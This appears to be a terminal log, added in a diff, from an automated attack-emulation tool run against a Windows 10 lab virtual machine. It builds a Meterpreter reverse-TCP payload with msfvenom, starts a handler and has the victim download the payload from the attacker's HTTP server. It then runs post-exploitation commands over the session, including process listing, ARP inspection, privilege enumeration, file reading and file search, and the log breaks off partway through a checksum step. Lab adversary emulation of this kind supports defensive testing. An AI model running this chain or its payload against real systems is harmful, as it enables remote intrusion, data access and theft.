@@ -1,0 +1,887 @@
+┌──(env_aurora-executor)─(kali㉿kali)-[~/Aurora-demos/attacks_windows_0218/1_AA23-341A/output]
+└─$ python 1_AA23-341A_attack_chain.py
+/home/kali/Aurora-demos/attacks_windows_0218/1_AA23-341A/output/1_AA23-341A_attack_chain.py:734: SyntaxWarning: invalid escape sequence '\S'
+  """
+╭──────────────── Hello ────────────────╮
+│ 🎯 Welcome to Attack Execution Wizard │
+╰───────────── Let's Begin ─────────────╯
+
+📌[MSFVenom Console] Step 1
+
+📌[Name] Build the executable file of a Meterpreter session (for Windows) using MSFVenom
+ Parameter Input
+  Parameter: LHOST
+  Description: IP address of the attacker machine
+➤ Enter value for LHOST (default: None, required: True): 192.168.56.101
+ Parameter Input
+  Parameter: LPORT
+  Description: listening port of the attacter machine
+➤ Enter value for LPORT (default: None, required: True): 8888
+ Parameter Input
+  Parameter: SAVE_PATH
+  Description: Saved path of the generated payload
+➤ Enter value for SAVE_PATH (default: None, required: False): payload.exe
+Keep going with the next attack step? [y/n]: y
+
+[MSFVenom Console] Generating payload...
+[Command execution at] 1772822901806968387
+[All timestamps] [1772822901806968387]
+✓ Payload generated successfully
+[-] No platform was selected, choosing Msf::Module::Platform::Windows from the payload
+[-] No arch selected, selecting arch: x86 from the payload
+No encoder specified, outputting raw payload
+Payload size: 354 bytes
+Final size of exe file: 73802 bytes
+Saved as: payload.exe
+
+
+[MSFVenom Console] Starting Metasploit handler (windows/meterpreter/reverse_tcp)...
+[Command execution at] 1772822904262664875
+[All timestamps] [1772822901806968387, 1772822904262664875]
+✓ Handler started - waiting for victim to connect
+[FINISHED] Payload generated and Metasploit handler started successfully!😊
+
+📌[Human] Step 2
+
+📌[Name] Simulate the victim download and execute malicious payload file
+ Parameter Input
+  Parameter: LHOST
+  Description: IP address of the http file server (typically the attacker machine)
+➤ Enter value for LHOST (default: None, required: False): 192.168.56.101
+ Parameter Input
+  Parameter: LPORT
+  Description: port of the http file server
+➤ Enter value for LPORT (default: 8000, required: False): 
+ Parameter Input
+  Parameter: SAVE_PATH
+  Description: Saved path of the downloaded payload
+➤ Enter value for SAVE_PATH (default: None, required: True): C:\Users\victim\Downloads\payload.exe
+    (This step needs human interaction and (temporarily) cannot be executed automatically)
+    (On attacker's machine)
+    python -m http.server 8000
+
+    (On victim's machine)
+    1. Open 192.168.56.101:8000 in the browser
+    2. Navigate to the path of the target payload file
+    3. Download the payload file
+    4. Execute the payload file to C:\Users\victim\Downloads\payload.exe (If on a Linux machine, you also need to chmod the file)
+
+    
+Keep going with the next attack step? [y/n]: y
+
+📌[None] Step 3
+
+📌[Name] Execute a Meterpreter Payload
+
+📌[Meterpreter Executor] Step 4
+
+📌[Name] List Processes
+ Parameter Input
+  Parameter: Executor
+  Description: The Meterpreter session ID of the active Metasploit connection
+  Select from available Meterpreter sessions:
+
+Available Meterpreter Sessions:
+[1] WIN10-BASIC-TAR\victim @ WIN10-BASIC-TAR
+Select session ID: 1
+Set the default session id as: 1!
+Selected meterpreter session: 1
+
+[Meterpreter Executor] Executing: ps
+Keep going with the next attack step? [y/n]: y
+[Command execution at] 1772823039187858254
+[All timestamps] [1772822901806968387, 1772822904262664875, 1772823039187858254]
+
+Process List
+============
+
+ PID    PPID   Name         Arch  Session  User              Path
+ ---    ----   ----         ----  -------  ----              ----
+ 0      0      [System Pro
+               cess]
+ 4      0      System       x64   0
+ 124    4      Registry     x64   0
+ 392    4      smss.exe     x64   0
+ 436    728    svchost.exe  x64   0        NT AUTHORITY\SYS  C:\Windows\System
+                                           TEM               32\svchost.exe
+ 496    476    csrss.exe    x64   0
+ 544    728    svchost.exe  x64   0
+ 576    728    svchost.exe  x64   0        NT AUTHORITY\SYS  C:\Windows\System
+                                           TEM               32\svchost.exe
+ 584    476    wininit.exe  x64   0
+ 592    576    csrss.exe    x64   1
+ 684    576    winlogon.ex  x64   1        NT AUTHORITY\SYS  C:\Windows\System
+               e                           TEM               32\winlogon.exe
+ 728    584    services.ex  x64   0
+               e
+ 752    584    lsass.exe    x64   0        NT AUTHORITY\SYS  C:\Windows\System
+                                           TEM               32\lsass.exe
+ 764    1464   taskhostw.e  x64   1        WIN10-BASIC-TAR\  C:\Windows\System
+               xe                          victim            32\taskhostw.exe
+ 796    11828  setup.exe    x64   0        NT AUTHORITY\SYS  C:\Program Files
+                                           TEM               (x86)\Microsoft\E
+                                                             dgeWebView\Applic
+                                                             ation\145.0.3800.
+                                                             82\Installer\setu
+                                                             p.exe
+ 804    1868   MusNotifyIc  x64   1        WIN10-BASIC-TAR\  C:\Windows\System
+               on.exe                      victim            32\MusNotifyIcon.
+                                                             exe
+ 880    728    svchost.exe  x64   0        NT AUTHORITY\SYS  C:\Windows\System
+                                           TEM               32\svchost.exe
+ 888    728    svchost.exe  x64   0        NT AUTHORITY\SYS  C:\Windows\System
+                                           TEM               32\svchost.exe
+ 896    684    fontdrvhost  x64   1        Font Driver Host  C:\Windows\System
+               .exe                        \UMFD-1           32\fontdrvhost.ex
+                                                             e
+ 912    584    fontdrvhost  x64   0        Font Driver Host  C:\Windows\System
+               .exe                        \UMFD-0           32\fontdrvhost.ex
+                                                             e
+ 996    728    svchost.exe  x64   0        NT AUTHORITY\NET  C:\Windows\System
+                                           WORK SERVICE      32\svchost.exe
+ 1036   728    svchost.exe  x64   0        NT AUTHORITY\LOC  C:\Windows\System
+                                           AL SERVICE        32\svchost.exe
+ 1076   684    dwm.exe      x64   1        Window Manager\D  C:\Windows\System
+                                           WM-1              32\dwm.exe
+ 1108   728    svchost.exe  x64   0        NT AUTHORITY\SYS  C:\Windows\System
+                                           TEM               32\svchost.exe
+ 1116   728    svchost.exe  x64   0        NT AUTHORITY\LOC  C:\Windows\System
+                                           AL SERVICE        32\svchost.exe
+ 1144   728    svchost.exe  x64   0        NT AUTHORITY\SYS  C:\Windows\System
+                                           TEM               32\svchost.exe
+ 1172   1820   ctfmon.exe   x64   1        WIN10-BASIC-TAR\  C:\Windows\System
+                                           victim            32\ctfmon.exe
+ 1212   2124   audiodg.exe  x64   0        NT AUTHORITY\LOC  C:\Windows\System
+                                           AL SERVICE        32\audiodg.exe
+ 1240   728    svchost.exe  x64   0        NT AUTHORITY\LOC  C:\Windows\System
+                                           AL SERVICE        32\svchost.exe
+ 1268   728    svchost.exe  x64   0        NT AUTHORITY\LOC  C:\Windows\System
+                                           AL SERVICE        32\svchost.exe
+ 1292   12244  msedge.exe   x64   1        WIN10-BASIC-TAR\  C:\Program Files
+                                           victim            (x86)\Microsoft\E
+                                                             dge\Application\m
+                                                             sedge.exe
+ 1324   4040   SearchProto  x64   0        NT AUTHORITY\SYS  C:\Windows\System
+               colHost.exe                 TEM               32\SearchProtocol
+                                                             Host.exe
+ 1360   728    svchost.exe  x64   0        NT AUTHORITY\SYS  C:\Windows\System
+                                           TEM               32\svchost.exe
+ 1380   5380   explorer.ex  x64   1        WIN10-BASIC-TAR\  C:\Windows\explor
+               e                           victim            er.exe
+ 1432   728    VBoxService  x64   0        NT AUTHORITY\SYS  C:\Windows\System
+               .exe                        TEM               32\VBoxService.ex
+                                                             e
+ 1464   728    svchost.exe  x64   0        NT AUTHORITY\SYS  C:\Windows\System
+                                           TEM               32\svchost.exe
+ 1508   728    svchost.exe  x64   0        NT AUTHORITY\SYS  C:\Windows\System
+                                           TEM               32\svchost.exe
+ 1512   728    svchost.exe  x64   0        NT AUTHORITY\NET  C:\Windows\System
+                                           WORK SERVICE      32\svchost.exe
+ 1616   728    svchost.exe  x64   0        NT AUTHORITY\SYS  C:\Windows\System
+                                           TEM               32\svchost.exe
+ 1624   728    svchost.exe  x64   0        NT AUTHORITY\SYS  C:\Windows\System
+                                           TEM               32\svchost.exe
+ 1632   11128  MicrosoftEd  x86   0        NT AUTHORITY\SYS  C:\Program Files
+               geUpdate.ex                 TEM               (x86)\Microsoft\E
+               e                                             dgeUpdate\Microso
+                                                             ftEdgeUpdate.exe
+ 1640   728    svchost.exe  x64   0        NT AUTHORITY\SYS  C:\Windows\System
+                                           TEM               32\svchost.exe
+ 1648   728    svchost.exe  x64   0        NT AUTHORITY\LOC  C:\Windows\System
+                                           AL SERVICE        32\svchost.exe
+ 1668   11904  msedgewebvi  x64   1        WIN10-BASIC-TAR\  C:\Program Files
+               ew2.exe                     victim            (x86)\Microsoft\E
+                                                             dgeWebView\Applic
+                                                             ation\143.0.3650.
+                                                             139\msedgewebview
+                                                             2.exe
+ 1772   4      Memory Comp  x64   0
+               ression
+ 1808   728    svchost.exe  x64   0        NT AUTHORITY\LOC  C:\Windows\System
+                                           AL SERVICE        32\svchost.exe
+ 1820   728    svchost.exe  x64   0        NT AUTHORITY\SYS  C:\Windows\System
+                                           TEM               32\svchost.exe
+ 1836   728    svchost.exe  x64   0        NT AUTHORITY\SYS  C:\Windows\System
+                                           TEM               32\svchost.exe
+ 1852   728    svchost.exe  x64   0        NT AUTHORITY\SYS  C:\Windows\System
+                                           TEM               32\svchost.exe
+ 1872   728    svchost.exe  x64   0        NT AUTHORITY\SYS  C:\Windows\System
+                                           TEM               32\svchost.exe
+ 1920   728    svchost.exe  x64   0        NT AUTHORITY\SYS  C:\Windows\System
+                                           TEM               32\svchost.exe
+ 1928   728    svchost.exe  x64   0        NT AUTHORITY\LOC  C:\Windows\System
+                                           AL SERVICE        32\svchost.exe
+ 2124   728    svchost.exe  x64   0        NT AUTHORITY\LOC  C:\Windows\System
+                                           AL SERVICE        32\svchost.exe
+ 2212   728    svchost.exe  x64   0        NT AUTHORITY\SYS  C:\Windows\System
+                                           TEM               32\svchost.exe
+ 2268   728    svchost.exe  x64   0        NT AUTHORITY\NET  C:\Windows\System
+                                           WORK SERVICE      32\svchost.exe
+ 2276   728    svchost.exe  x64   0        NT AUTHORITY\LOC  C:\Windows\System
+                                           AL SERVICE        32\svchost.exe
+ 2284   728    svchost.exe  x64   0        NT AUTHORITY\LOC  C:\Windows\System
+                                           AL SERVICE        32\svchost.exe
+ 2312   728    svchost.exe  x64   0
+ 2352   728    svchost.exe  x64   0        NT AUTHORITY\SYS  C:\Windows\System
+                                           TEM               32\svchost.exe
+ 2460   728    svchost.exe  x64   0        NT AUTHORITY\LOC  C:\Windows\System
+                                           AL SERVICE        32\svchost.exe
+ 2492   728    spoolsv.exe  x64   0        NT AUTHORITY\SYS  C:\Windows\System
+                                           TEM               32\spoolsv.exe
+ 2556   728    svchost.exe  x64   0        NT AUTHORITY\LOC  C:\Windows\System
+                                           AL SERVICE        32\svchost.exe
+ 2616   728    svchost.exe  x64   0        NT AUTHORITY\NET  C:\Windows\System
+                                           WORK SERVICE      32\svchost.exe
+ 2704   728    svchost.exe  x64   0        NT AUTHORITY\SYS  C:\Windows\System
+                                           TEM               32\svchost.exe
+ 2712   728    svchost.exe  x64   0        NT AUTHORITY\NET  C:\Windows\System
+                                           WORK SERVICE      32\svchost.exe
+ 2776   728    svchost.exe  x64   0        NT AUTHORITY\LOC  C:\Windows\System
+                                           AL SERVICE        32\svchost.exe
+ 2792   728    svchost.exe  x64   0        NT AUTHORITY\NET  C:\Windows\System
+                                           WORK SERVICE      32\svchost.exe
+ 2804   728    svchost.exe  x64   0        NT AUTHORITY\LOC  C:\Windows\System
+                                           AL SERVICE        32\svchost.exe
+ 2812   728    svchost.exe  x64   0        NT AUTHORITY\SYS  C:\Windows\System
+                                           TEM               32\svchost.exe
+ 2820   728    svchost.exe  x64   0        NT AUTHORITY\SYS  C:\Windows\System
+                                           TEM               32\svchost.exe
+ 2828   728    svchost.exe  x64   0        NT AUTHORITY\SYS  C:\Windows\System
+                                           TEM               32\svchost.exe
+ 2880   728    svchost.exe  x64   0        NT AUTHORITY\SYS  C:\Windows\System
+                                           TEM               32\svchost.exe
+ 2904   728    svchost.exe  x64   0        NT AUTHORITY\LOC  C:\Windows\System
+                                           AL SERVICE        32\svchost.exe
+ 2928   728    svchost.exe  x64   0        NT AUTHORITY\SYS  C:\Windows\System
+                                           TEM               32\svchost.exe
+ 2936   728    svchost.exe  x64   0        NT AUTHORITY\SYS  C:\Windows\System
+                                           TEM               32\svchost.exe
+ 3044   1464   taskhostw.e  x64   1        WIN10-BASIC-TAR\  C:\Windows\System
+               xe                          victim            32\taskhostw.exe
+ 3052   880    UserOOBEBro  x64   1        WIN10-BASIC-TAR\  C:\Windows\System
+               ker.exe                     victim            32\oobe\UserOOBEB
+                                                             roker.exe
+ 3060   728    svchost.exe  x64   0        NT AUTHORITY\LOC  C:\Windows\System
+                                           AL SERVICE        32\svchost.exe
+ 3068   728    svchost.exe  x64   0        NT AUTHORITY\SYS  C:\Windows\System
+                                           TEM               32\svchost.exe
+ 3292   728    svchost.exe  x64   0        NT AUTHORITY\SYS  C:\Windows\System
+                                           TEM               32\svchost.exe
+ 3560   728    svchost.exe  x64   1        WIN10-BASIC-TAR\  C:\Windows\System
+                                           victim            32\svchost.exe
+ 3604   728    svchost.exe  x64   0        NT AUTHORITY\LOC  C:\Windows\System
+                                           AL SERVICE        32\svchost.exe
+ 3676   880    RuntimeBrok  x64   1        WIN10-BASIC-TAR\  C:\Windows\System
+               er.exe                      victim            32\RuntimeBroker.
+                                                             exe
+ 3708   12244  msedge.exe   x64   1        WIN10-BASIC-TAR\  C:\Program Files
+                                           victim            (x86)\Microsoft\E
+                                                             dge\Application\m
+                                                             sedge.exe
+ 3864   880    dllhost.exe  x64   0        NT AUTHORITY\SYS  C:\Windows\System
+                                           TEM               32\dllhost.exe
+ 4040   728    SearchIndex  x64   0        NT AUTHORITY\SYS  C:\Windows\System
+               er.exe                      TEM               32\SearchIndexer.
+                                                             exe
+ 4072   728    svchost.exe  x64   0
+ 4168   728    MpDefenderC  x64   0
+               oreService.
+               exe
+ 4216   728    svchost.exe  x64   0        NT AUTHORITY\SYS  C:\Windows\System
+                                           TEM               32\svchost.exe
+ 4316   728    svchost.exe  x64   0        NT AUTHORITY\LOC  C:\Windows\System
+                                           AL SERVICE        32\svchost.exe
+ 4320   728    svchost.exe  x64   0        NT AUTHORITY\LOC  C:\Windows\System
+                                           AL SERVICE        32\svchost.exe
+ 4336   728    svchost.exe  x64   0        NT AUTHORITY\SYS  C:\Windows\System
+                                           TEM               32\svchost.exe
+ 4404   728    svchost.exe  x64   0        NT AUTHORITY\LOC  C:\Windows\System
+                                           AL SERVICE        32\svchost.exe
+ 4424   728    svchost.exe  x64   0
+ 4508   728    svchost.exe  x64   0        NT AUTHORITY\SYS  C:\Windows\System
+                                           TEM               32\svchost.exe
+ 4580   728    svchost.exe  x64   0        NT AUTHORITY\SYS  C:\Windows\System
+                                           TEM               32\svchost.exe
+ 4884   728    svchost.exe  x64   1        WIN10-BASIC-TAR\  C:\Windows\System
+                                           victim            32\svchost.exe
+ 4944   2812   AggregatorH  x64   0        NT AUTHORITY\SYS  C:\Windows\System
+               ost.exe                     TEM               32\AggregatorHost
+                                                             .exe
+ 4960   728    svchost.exe  x64   0        NT AUTHORITY\SYS  C:\Windows\System
+                                           TEM               32\svchost.exe
+ 5392   880    MoUsoCoreWo  x64   0        NT AUTHORITY\SYS  C:\Windows\System
+               rker.exe                    TEM               32\MoUsoCoreWorke
+                                                             r.exe
+ 5812   728    svchost.exe  x64   0        NT AUTHORITY\NET  C:\Windows\System
+                                           WORK SERVICE      32\svchost.exe
+ 5908   728    svchost.exe  x64   0        NT AUTHORITY\LOC  C:\Windows\System
+                                           AL SERVICE        32\svchost.exe
+ 5984   11904  msedgewebvi  x64   1        WIN10-BASIC-TAR\  C:\Program Files
+               ew2.exe                     victim            (x86)\Microsoft\E
+                                                             dgeWebView\Applic
+                                                             ation\143.0.3650.
+                                                             139\msedgewebview
+                                                             2.exe
+ 6136   1852   sihost.exe   x64   1        WIN10-BASIC-TAR\  C:\Windows\System
+                                           victim            32\sihost.exe
+ 6324   728    msiexec.exe  x64   0        NT AUTHORITY\SYS  C:\Windows\System
+                                           TEM               32\msiexec.exe
+ 6424   2320   OneDrive.ex  x64   1        WIN10-BASIC-TAR\  C:\Users\victim\A
+               e                           victim            ppData\Local\Micr
+                                                             osoft\OneDrive\On
+                                                             eDrive.exe
+ 6440   880    SearchApp.e  x64   1        WIN10-BASIC-TAR\  C:\Windows\System
+               xe                          victim            Apps\Microsoft.Wi
+                                                             ndows.Search_cw5n
+                                                             1h2txyewy\SearchA
+                                                             pp.exe
+ 6488   728    svchost.exe  x64   0        NT AUTHORITY\SYS  C:\Windows\System
+                                           TEM               32\svchost.exe
+ 6608   728    svchost.exe  x64   1        WIN10-BASIC-TAR\  C:\Windows\System
+                                           victim            32\svchost.exe
+ 6792   728    svchost.exe  x64   1        WIN10-BASIC-TAR\  C:\Windows\System
+                                           victim            32\svchost.exe
+ 6940   880    StartMenuEx  x64   1        WIN10-BASIC-TAR\  C:\Windows\System
+               perienceHos                 victim            Apps\Microsoft.Wi
+               t.exe                                         ndows.StartMenuEx
+                                                             perienceHost_cw5n
+                                                             1h2txyewy\StartMe
+                                                             nuExperienceHost.
+                                                             exe
+ 6948   880    dllhost.exe  x64   1        WIN10-BASIC-TAR\  C:\Windows\System
+                                           victim            32\dllhost.exe
+ 7320   880    RuntimeBrok  x64   1        WIN10-BASIC-TAR\  C:\Windows\System
+               er.exe                      victim            32\RuntimeBroker.
+                                                             exe
+ 7544   12244  msedge.exe   x64   1        WIN10-BASIC-TAR\  C:\Program Files
+                                           victim            (x86)\Microsoft\E
+                                                             dge\Application\m
+                                                             sedge.exe
+ 7576   11904  msedgewebvi  x64   1        WIN10-BASIC-TAR\  C:\Program Files
+               ew2.exe                     victim            (x86)\Microsoft\E
+                                                             dgeWebView\Applic
+                                                             ation\143.0.3650.
+                                                             139\msedgewebview
+                                                             2.exe
+ 8084   11904  msedgewebvi  x64   1        WIN10-BASIC-TAR\  C:\Program Files
+               ew2.exe                     victim            (x86)\Microsoft\E
+                                                             dgeWebView\Applic
+                                                             ation\143.0.3650.
+                                                             139\msedgewebview
+                                                             2.exe
+ 8124   6424   OneDrive.Sy  x64   1        WIN10-BASIC-TAR\  C:\Users\victim\A
+               nc.Service.                 victim            ppData\Local\Micr
+               exe                                           osoft\OneDrive\26
+                                                             .012.0119.0002\On
+                                                             eDrive.Sync.Servi
+                                                             ce.exe
+ 8180   880    RuntimeBrok  x64   1        WIN10-BASIC-TAR\  C:\Windows\System
+               er.exe                      victim            32\RuntimeBroker.
+                                                             exe
+ 8344   880    ShellExperi  x64   1        WIN10-BASIC-TAR\  C:\Windows\System
+               enceHost.ex                 victim            Apps\ShellExperie
+               e                                             nceHost_cw5n1h2tx
+                                                             yewy\ShellExperie
+                                                             nceHost.exe
+ 8432   880    RuntimeBrok  x64   1        WIN10-BASIC-TAR\  C:\Windows\System
+               er.exe                      victim            32\RuntimeBroker.
+                                                             exe
+ 8484   12244  msedge.exe   x64   1        WIN10-BASIC-TAR\  C:\Program Files
+                                           victim            (x86)\Microsoft\E
+                                                             dge\Application\m
+                                                             sedge.exe
+ 8492   728    svchost.exe  x64   0        NT AUTHORITY\SYS  C:\Windows\System
+                                           TEM               32\svchost.exe
+ 8524   728    svchost.exe  x64   0        NT AUTHORITY\LOC  C:\Windows\System
+                                           AL SERVICE        32\svchost.exe
+ 8820   1380   VBoxTray.ex  x64   1        WIN10-BASIC-TAR\  C:\Windows\System
+               e                           victim            32\VBoxTray.exe
+ 8888   1380   SecurityHea  x64   1        WIN10-BASIC-TAR\  C:\Windows\System
+               lthSystray.                 victim            32\SecurityHealth
+               exe                                           Systray.exe
+ 8904   11904  msedgewebvi  x64   1        WIN10-BASIC-TAR\  C:\Program Files
+               ew2.exe                     victim            (x86)\Microsoft\E
+                                                             dgeWebView\Applic
+                                                             ation\143.0.3650.
+                                                             139\msedgewebview
+                                                             2.exe
+ 9072   728    SecurityHea  x64   0
+               lthService.
+               exe
+ 9112   880    TextInputHo  x64   1        WIN10-BASIC-TAR\  C:\Windows\System
+               st.exe                      victim            Apps\MicrosoftWin
+                                                             dows.Client.CBS_c
+                                                             w5n1h2txyewy\Text
+                                                             InputHost.exe
+ 9204   728    svchost.exe  x64   0        NT AUTHORITY\LOC  C:\Windows\System
+                                           AL SERVICE        32\svchost.exe
+ 9988   728    svchost.exe  x64   0        NT AUTHORITY\SYS  C:\Windows\System
+                                           TEM               32\svchost.exe
+ 10068  880    Application  x64   1        WIN10-BASIC-TAR\  C:\Windows\System
+               FrameHost.e                 victim            32\ApplicationFra
+               xe                                            meHost.exe
+ 10128  1380   payload.exe  x86   1        WIN10-BASIC-TAR\  C:\Users\victim\D
+                                           victim            ownloads\payload.
+                                                             exe
+ 10324  728    svchost.exe  x64   0        NT AUTHORITY\LOC  C:\Windows\System
+                                           AL SERVICE        32\svchost.exe
+ 10384  6136   M365Copilot  x64   1        WIN10-BASIC-TAR\  C:\Program Files\
+               .exe                        victim            WindowsApps\Micro
+                                                             soft.MicrosoftOff
+                                                             iceHub_19.2601.39
+                                                             061.0_x64__8wekyb
+                                                             3d8bbwe\M365Copil
+                                                             ot.exe
+ 10464  728    svchost.exe  x64   0        NT AUTHORITY\SYS  C:\Windows\System
+                                           TEM               32\svchost.exe
+ 10620  880    RuntimeBrok  x64   1        WIN10-BASIC-TAR\  C:\Windows\System
+               er.exe                      victim            32\RuntimeBroker.
+                                                             exe
+ 10940  12244  msedge.exe   x64   1        WIN10-BASIC-TAR\  C:\Program Files
+                                           victim            (x86)\Microsoft\E
+                                                             dge\Application\m
+                                                             sedge.exe
+ 10944  4040   SearchProto  x64   1        WIN10-BASIC-TAR\  C:\Windows\System
+               colHost.exe                 victim            32\SearchProtocol
+                                                             Host.exe
+ 11424  880    SearchApp.e  x64   1        WIN10-BASIC-TAR\  C:\Windows\System
+               xe                          victim            Apps\Microsoft.Wi
+                                                             ndows.Search_cw5n
+                                                             1h2txyewy\SearchA
+                                                             pp.exe
+ 11452  728    MsMpEng.exe  x64   0
+ 11556  12244  msedge.exe   x64   1        WIN10-BASIC-TAR\  C:\Program Files
+                                           victim            (x86)\Microsoft\E
+                                                             dge\Application\m
+                                                             sedge.exe
+ 11604  12244  msedge.exe   x64   1        WIN10-BASIC-TAR\  C:\Program Files
+                                           victim            (x86)\Microsoft\E
+                                                             dge\Application\m
+                                                             sedge.exe
+ 11716  880    WmiPrvSE.ex  x64   0        NT AUTHORITY\SYS  C:\Windows\System
+               e                           TEM               32\wbem\WmiPrvSE.
+                                                             exe
+ 11820  728    svchost.exe  x64   0        NT AUTHORITY\SYS  C:\Windows\System
+                                           TEM               32\svchost.exe
+ 11828  9256   setup.exe    x64   0        NT AUTHORITY\SYS  C:\Program Files
+                                           TEM               (x86)\Microsoft\E
+                                                             dgeWebView\Applic
+                                                             ation\145.0.3800.
+                                                             82\Installer\setu
+                                                             p.exe
+ 11848  880    smartscreen  x64   1        WIN10-BASIC-TAR\  C:\Windows\System
+               .exe                        victim            32\smartscreen.ex
+                                                             e
+ 11868  1464   taskhostw.e  x64   1        WIN10-BASIC-TAR\  C:\Windows\System
+               xe                          victim            32\taskhostw.exe
+ 11904  10384  msedgewebvi  x64   1        WIN10-BASIC-TAR\  C:\Program Files
+               ew2.exe                     victim            (x86)\Microsoft\E
+                                                             dgeWebView\Applic
+                                                             ation\143.0.3650.
+                                                             139\msedgewebview
+                                                             2.exe
+ 12244  9940   msedge.exe   x64   1        WIN10-BASIC-TAR\  C:\Program Files
+                                           victim            (x86)\Microsoft\E
+                                                             dge\Application\m
+                                                             sedge.exe
+ 13104  13208  conhost.exe  x64   1        WIN10-BASIC-TAR\  C:\Windows\System
+                                           victim            32\conhost.exe
+ 13200  4040   SearchFilte  x64   0        NT AUTHORITY\SYS  C:\Windows\System
+               rHost.exe                   TEM               32\SearchFilterHo
+                                                             st.exe
+ 13208  1380   ETWData.exe  x64   1        WIN10-BASIC-TAR\  C:\Users\victim\D
+                                           victim            esktop\x64\ETWDat
+                                                             a.exe
+
+
+
+📌[Meterpreter Executor] Step 5
+
+📌[Name] ARP Cache Inspection
+ Parameter Input
+  Parameter: Executor
+  Description: The Meterpreter session ID of the active Metasploit connection
+  ✓ Using stored value: 1
+
+[Meterpreter Executor] Executing: arp
+Keep going with the next attack step? [y/n]: y
+[Command execution at] 1772823047722843470
+[All timestamps] [1772822901806968387, 1772822904262664875, 1772823039187858254, 1772823047722843470]
+
+ARP cache
+=========
+
+    IP address       MAC address        Interface
+    ----------       -----------        ---------
+    10.0.2.2         52:55:0a:00:02:02  Intel(R) PRO/1000 MT Desktop Adapter
+    10.0.2.3         52:55:0a:00:02:03  Intel(R) PRO/1000 MT Desktop Adapter
+    10.0.2.255       ff:ff:ff:ff:ff:ff  Intel(R) PRO/1000 MT Desktop Adapter
+    192.168.56.101   08:00:27:6b:40:79  Intel(R) PRO/1000 MT Desktop Adapter #
+                                        2
+    192.168.56.255   ff:ff:ff:ff:ff:ff  Intel(R) PRO/1000 MT Desktop Adapter #
+                                        2
+    224.0.0.22       00:00:00:00:00:00  Software Loopback Interface 1
+    224.0.0.22       01:00:5e:00:00:16  Intel(R) PRO/1000 MT Desktop Adapter
+    224.0.0.22       01:00:5e:00:00:16  Intel(R) PRO/1000 MT Desktop Adapter #
+                                        2
+    224.0.0.251      01:00:5e:00:00:fb  Intel(R) PRO/1000 MT Desktop Adapter
+    224.0.0.251      01:00:5e:00:00:fb  Intel(R) PRO/1000 MT Desktop Adapter #
+                                        2
+    224.0.0.252      01:00:5e:00:00:fc  Intel(R) PRO/1000 MT Desktop Adapter
+    224.0.0.252      01:00:5e:00:00:fc  Intel(R) PRO/1000 MT Desktop Adapter #
+                                        2
+    239.255.255.250  00:00:00:00:00:00  Software Loopback Interface 1
+    239.255.255.250  01:00:5e:7f:ff:fa  Intel(R) PRO/1000 MT Desktop Adapter
+    239.255.255.250  01:00:5e:7f:ff:fa  Intel(R) PRO/1000 MT Desktop Adapter #
+                                        2
+    255.255.255.255  ff:ff:ff:ff:ff:ff  Intel(R) PRO/1000 MT Desktop Adapter
+    255.255.255.255  ff:ff:ff:ff:ff:ff  Intel(R) PRO/1000 MT Desktop Adapter #
+                                        2
+
+
+
+📌[Meterpreter Executor] Step 6
+
+📌[Name] Discovery
+ Parameter Input
+  Parameter: Executor
+  Description: The Meterpreter session ID of the active Metasploit connection
+  ✓ Using stored value: 1
+
+[Meterpreter Executor] Executing: getprivs
+Keep going with the next attack step? [y/n]: y
+[Command execution at] 1772823073926701913
+[All timestamps] [1772822901806968387, 1772822904262664875, 1772823039187858254, 1772823047722843470, 1772823073926701913]
+
+Enabled Process Privileges
+==========================
+
+Name
+----
+SeBackupPrivilege
+SeChangeNotifyPrivilege
+SeCreateGlobalPrivilege
+SeCreatePagefilePrivilege
+SeCreateSymbolicLinkPrivilege
+SeDebugPrivilege
+SeDelegateSessionUserImpersonatePrivilege
+SeImpersonatePrivilege
+SeIncreaseBasePriorityPrivilege
+SeIncreaseQuotaPrivilege
+SeIncreaseWorkingSetPrivilege
+SeLoadDriverPrivilege
+SeManageVolumePrivilege
+SeProfileSingleProcessPrivilege
+SeRemoteShutdownPrivilege
+SeRestorePrivilege
+SeSecurityPrivilege
+SeShutdownPrivilege
+SeSystemEnvironmentPrivilege
+SeSystemProfilePrivilege
+SeSystemtimePrivilege
+SeTakeOwnershipPrivilege
+SeTimeZonePrivilege
+SeUndockPrivilege
+
+
+
+📌[Meterpreter Executor] Step 7
+
+📌[Name] Read File Content
+ Parameter Input
+  Parameter: Executor
+  Description: The Meterpreter session ID of the active Metasploit connection
+  ✓ Using stored value: 1
+
+📌[Meterpreter Executor] Step 7 Parameter Input
+  Parameter: FilePath
+  Description: Full path to the target file on remote system
+➤ Enter value for FilePath (default: , required: True): C:\Users\victim\Downloads\hello.txt
+
+[Meterpreter Executor] Executing: cat
+Keep going with the next attack step? [y/n]: y
+[Command execution at] 1772823098204312142
+[All timestamps] [1772822901806968387, 1772822904262664875, 1772823039187858254, 1772823047722843470, 1772823073926701913, 1772823098204312142]
+hellohello
+
+📌[Meterpreter Executor] Step 8
+
+📌[Name] Get Active Desktop
+ Parameter Input
+  Parameter: Executor
+  Description: The Meterpreter session ID of the active Metasploit connection
+  ✓ Using stored value: 1
+
+[Meterpreter Executor] Executing: getdesktop
+Keep going with the next attack step? [y/n]: y
+[Command execution at] 1772823110203706212
+[All timestamps] [1772822901806968387, 1772822904262664875, 1772823039187858254, 1772823047722843470, 1772823073926701913, 1772823098204312142, 
+1772823110203706212]
+Session 1\WinSta0\Default
+
+
+📌[Meterpreter Executor] Step 9
+
+📌[Name] File Search
+ Parameter Input
+  Parameter: Executor
+  Description: The Meterpreter session ID of the active Metasploit connection
+  ✓ Using stored value: 1
+
+📌[Meterpreter Executor] Step 9 Parameter Input
+  Parameter: Pattern
+  Description: File search pattern (e.g., *.txt)
+➤ Enter value for Pattern (default: , required: True): *.zip
+
+[Meterpreter Executor] Executing: search
+Keep going with the next attack step? [y/n]: y
+[Command execution at] 1772823129488281631
+[All timestamps] [1772822901806968387, 1772822904262664875, 1772823039187858254, 1772823047722843470, 1772823073926701913, 1772823098204312142, 
+1772823110203706212, 1772823129488281631]
+Found 2 results...
+==================
+
+Path                                                                                                           Size (bytes)  Modified (UTC)
+----                                                                                                           ------------  --------------
+c:\Program Files\WindowsApps\Microsoft.Microsoft3DViewer_7.2506.10022.0_x64__8wekyb3d8bbwe\Assets\Archive.zip  16130369      2026-01-12 09:35:23 -0600
+z:\attack123������������.zip                                                                                   30141792      2026-03-03 16:58:24 -0600
+
+
+
+📌[Meterpreter Executor] Step 10
+
+📌[Name] File Checksum Calculation
+ Parameter Input
+  Parameter: Executor
+  Description: The Meterpreter session ID of the active Metasploit connection
+  ✓ Using stored value: 1
+
+📌[Meterpreter Executor] Step 10 Parameter Input
+  Parameter: FilePath
